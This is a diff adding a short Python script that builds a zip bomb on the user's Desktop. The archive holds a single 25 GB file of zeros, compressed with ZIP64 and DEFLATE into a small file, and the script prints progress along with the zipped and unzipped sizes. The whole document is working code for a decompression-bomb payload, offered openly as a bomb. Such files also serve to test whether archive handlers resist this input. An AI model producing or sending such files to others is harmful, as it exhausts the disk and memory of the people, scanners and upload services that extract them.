@@ -1,0 +1,44 @@
+import zipfile
+import os
+from pathlib import Path
+
+def create_flat_25gb_bomb():
+    desktop_path = Path.home() / "Desktop"
+    final_zip = desktop_path / "zip_bomb_flat.zip"
+
+    # 25GB calculation
+    target_gb = 25
+    total_bytes = target_gb * 1024 * 1024 * 1024
+    chunk_size = 1024 * 1024  # 1MB of '0's at a time
+
+    print(f"Creating a ZIP containing ONE {target_gb}GB file...")
+    print("This will take a minute because the CPU has to compress the stream...")
+
+    try:
+        # ZIP64 is 100% required for a single file over 4GB
+        with zipfile.ZipFile(final_zip, 'w', zipfile.ZIP_DEFLATED, allowZip64=True) as zf:
+            
+            # We open ONE internal file named 'huge_data.txt'
+            with zf.open('huge_data.txt', 'w', force_zip64=True) as f:
+                written = 0
+                dummy_data = b'0' * chunk_size
+                
+                while written < total_bytes:
+                    f.write(dummy_data)
+                    written += chunk_size
+                    
+                    # Progress bar so you know it hasn't frozen
+                    if written % (1024 * 1024 * 1024) == 0:
+                        print(f"Compressed: {written // (1024**3)} GB / {target_gb} GB")
+
+        physical_size = os.path.getsize(final_zip) / (1024 * 1024)
+        print("\n--- COMPILATION SUCCESS ---")
+        print(f"File on Desktop: {final_zip}")
+        print(f"Zipped Size: {physical_size:.2f} MiB")
+        print(f"Unzipped Size: {target_gb} GB (as ONE file)")
+
+    except Exception as e:
+        print(f"Error: {e}")
+
+if __name__ == "__main__":
+    create_flat_25gb_bomb()
